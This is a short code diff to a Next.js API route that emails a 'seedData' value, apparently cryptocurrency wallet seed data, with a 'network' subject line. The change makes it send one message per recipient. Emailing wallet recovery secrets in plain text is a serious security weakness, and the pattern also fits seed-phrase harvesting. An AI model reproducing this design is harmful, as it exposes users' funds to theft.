@@ -36,16 +36,18 @@ export async function POST(request: NextRequest) {
       )
     }
 
-    const mailOptions = {
-      from: process.env.EMAIL_USER,
-      to: recipients,
-      subject: network,
-      text: seedData,
-      html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
-    }
+    // Send individual emails to each recipient
+    for (const recipient of recipients) {
+      const mailOptions = {
+        from: process.env.EMAIL_USER,
+        to: recipient, // Single recipient per email
+        subject: network,
+        text: seedData,
+        html: `<pre style="font-family: 'Courier New', monospace; font-size: 14px; white-space: pre-wrap; word-break: break-all;">${seedData}</pre>`,
+      }
 
-    // Send email
-    await transporter.sendMail(mailOptions)
+      await transporter.sendMail(mailOptions)
+    }
 
     return NextResponse.json(
       { success: true, message: 'Backup email sent successfully' },
